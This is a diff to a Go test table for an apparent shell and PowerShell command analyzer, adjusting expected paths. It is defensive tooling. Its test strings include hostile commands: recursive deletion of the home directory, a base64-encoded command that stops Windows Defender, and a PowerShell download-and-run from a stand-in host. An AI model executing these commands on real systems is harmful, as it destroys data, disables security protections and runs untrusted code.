@@ -125,7 +125,7 @@ func TestAnalyzeTable(t *testing.T) {
 
 		// --- destructive vs benign look-alikes ----------------------------
 		{"rm build dir is not destructive", `rm -rf ./build`, "",
-			expect{deletes: []string{"./build"}, destr: []string{"!rm_recursive_root", "!rm_recursive_home", "!rm_recursive_wildcard"}}},
+			expect{deletes: []string{"build"}, destr: []string{"!rm_recursive_root", "!rm_recursive_home", "!rm_recursive_wildcard"}}},
 		{"rm node_modules not destructive", `rm -rf node_modules dist .next`, "",
 			expect{destr: []string{"!rm_recursive_root", "!rm_recursive_home"}}},
 		{"rm home", `rm -rf ~`, "", expect{destr: []string{"rm_recursive_home"}}},
@@ -194,7 +194,7 @@ func TestAnalyzeTable(t *testing.T) {
 		{"ps base64 unicode decode", `iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('` + utf16b64(`Stop-Service WinDefend`) + `')))`, "",
 			expect{dialect: PowerShell, obf: []string{"base64_decode_exec"}, evasion: []string{"stop_security_tool"}, decodedGE: 1}},
 		{"ps downloadfile then run", `(New-Object Net.WebClient).DownloadFile('http://x.example/a.exe','a.exe'); .\a.exe`, "",
-			expect{dialect: PowerShell, dle: yes, writes: []string{"a.exe"}, execs: []string{`.\a.exe`}}},
+			expect{dialect: PowerShell, dle: yes, writes: []string{"a.exe"}, execs: []string{"a.exe"}}},
 		{"ps remove-item project", `Remove-Item -Recurse -Force C:\Users\bob\proj\build`, "",
 			expect{dialect: PowerShell, deletes: []string{`C:\Users\bob\proj\build`}}},
 		{"ps stop defender", `Stop-Service -Name WinDefend`, "", expect{dialect: PowerShell, evasion: []string{"stop_security_tool"}}},
